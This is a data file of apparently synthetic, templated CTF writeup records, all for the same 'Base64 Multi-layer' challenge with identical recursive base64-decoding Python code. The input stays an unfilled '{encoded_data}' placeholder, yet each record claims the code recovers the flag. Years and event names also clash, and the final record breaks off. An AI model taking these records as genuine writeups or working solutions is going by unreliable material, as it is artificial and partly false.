{"id": "synthetic_encoding_009", "team": "synthetic_team_6", "event": "CTF_2024_Event_4", "challenge_name": "Base64 Multi-layer #10", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/9", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836407", "synthetic": true}
{"id": "synthetic_encoding_010", "team": "synthetic_team_9", "event": "CTF_2024_Event_12", "challenge_name": "Base64 Multi-layer #11", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/10", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836419", "synthetic": true}
{"id": "synthetic_encoding_011", "team": "synthetic_team_8", "event": "CTF_2024_Event_18", "challenge_name": "Base64 Multi-layer #12", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/11", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836432", "synthetic": true}
{"id": "synthetic_encoding_012", "team": "synthetic_team_9", "event": "CTF_2024_Event_1", "challenge_name": "Base64 Multi-layer #13", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/12", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836444", "synthetic": true}
{"id": "synthetic_encoding_013", "team": "synthetic_team_1", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #14", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/13", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836458", "synthetic": true}
{"id": "synthetic_encoding_014", "team": "synthetic_team_7", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #15", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/14", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836471", "synthetic": true}
{"id": "synthetic_encoding_015", "team": "synthetic_team_4", "event": "CTF_2024_Event_5", "challenge_name": "Base64 Multi-layer #16", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/15", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836482", "synthetic": true}
{"id": "synthetic_encoding_016", "team": "synthetic_team_8", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #17", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/16", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836497", "synthetic": true}
{"id": "synthetic_encoding_017", "team": "synthetic_team_1", "event": "CTF_2024_Event_14", "challenge_name": "Base64 Multi-layer #18", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/17", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836512", "synthetic": true}
{"id": "synthetic_encoding_018", "team": "synthetic_team_1", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #19", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/18", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836526", "synthetic": true}
{"id": "synthetic_encoding_019", "team": "synthetic_team_9", "event": "CTF_2024_Event_13", "challenge_name": "Base64 Multi-layer #20", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/19", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836539", "synthetic": true}
{"id": "synthetic_encoding_020", "team": "synthetic_team_8", "event": "CTF_2024_Event_19", "challenge_name": "Base64 Multi-layer #21", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/20", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836552", "synthetic": true}
{"id": "synthetic_encoding_021", "team": "synthetic_team_2", "event": "CTF_2024_Event_7", "challenge_name": "Base64 Multi-layer #22", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/21", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836564", "synthetic": true}
{"id": "synthetic_encoding_022", "team": "synthetic_team_8", "event": "CTF_2024_Event_19", "challenge_name": "Base64 Multi-layer #23", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/22", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836576", "synthetic": true}
{"id": "synthetic_encoding_023", "team": "synthetic_team_1", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #24", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = 